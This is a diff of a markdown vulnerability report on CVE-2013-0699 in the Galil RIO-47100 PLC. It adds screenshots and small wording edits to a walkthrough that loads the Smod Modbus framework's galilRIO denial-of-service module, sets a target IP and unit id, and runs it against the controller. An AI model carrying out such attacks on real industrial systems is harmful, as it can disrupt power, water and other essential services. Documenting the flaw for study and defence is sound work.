@@ -41,14 +41,14 @@ The following Galil product is affected:
 ## Impact
 Successful exploitation of this vulnerability could allow an attacker to affect the availability for the Galil RIO-47100 PLC. This vulnerabilities other potential disastrous impacts of DoS attacks against SCADA/ICS systems include electrical blackouts, shutdown of water and sewage systems and other essential municipal services.
 Impact to individual organizations depends on many factors that are unique to each organization.
-## Background (Silinebilir)
+## Background
 Galil is a US-based company that maintains offices in Rocklin, California. Galil produces motion control products that are distributed globally.
 The affected product, RIO-47100 PLC, is a compact PLC system that includes I/O. According to Galil, RIO-47100 PLC is deployed across several sectors including energy, defense industrial base, and agriculture and food. Galil estimates that these products are used primarily in the United States and Europe with a small percentage in Asia.
 
 
 ---
 # Exploitation of Vulnerability 
-We are going to use [CVE-2013-0699](https://nvd.nist.gov/vuln/detail/CVE-2013-0699#match-3087197) in this spesific example. As we mentioned before, with this exploit; attacker can cause a denial of service of the system. 
+We are going to exploit [CVE-2013-0699](https://nvd.nist.gov/vuln/detail/CVE-2013-0699#match-3087197) in this spesific example. As we mentioned before, with this exploit; attacker can cause a denial of service of the system. 
 
 In order to exploit the vulnerability we need to download [Smod](https://github.com/Joshua1909/smod)
 After downloading smod we can run it by typing;
@@ -56,11 +56,18 @@ After downloading smod we can run it by typing;
 cd smod
 python smod.py
 ```
+
+<p align="center">
+  <img width="750" height="400" src="https://github.com/ics-scada/Reports/blob/main/Modbus/Screenshots/1.1.png">
+</p>
 We can see the ModBus Frameworks' modules by typing;
+
 ```
 show modules
 ```
-
+<p align="center">
+  <img width="750" height="400" src="https://github.com/ics-scada/Reports/blob/main/Modbus/Screenshots/1.2.png">
+</p>
 
 ```
 use /modbus/dos/galilRIO
@@ -69,7 +76,7 @@ use /modbus/dos/galilRIO
 ```
 show options
 ```
-We have checked what parameters our exploit needs to run. This exploit needs; 
+We have checked which parameters our exploit needs to run. This exploit needs; 
 `RHOST` = remote host ip address,
 `UID` = Unit id,
 paramateres.
@@ -77,10 +84,15 @@ paramateres.
 set RHOST <ip>
 set UID <uid>
 ```
+
 After giving the parameters which are wanted we are ready to run it. 
 ```
 exploit
 ```
+<p align="center">
+  <img width="750" height="400" src="https://github.com/ics-scada/Reports/blob/main/Modbus/Screenshots/1.5.png">
+</p>
+
 As you can see above, dos attack has started.
 
 ---
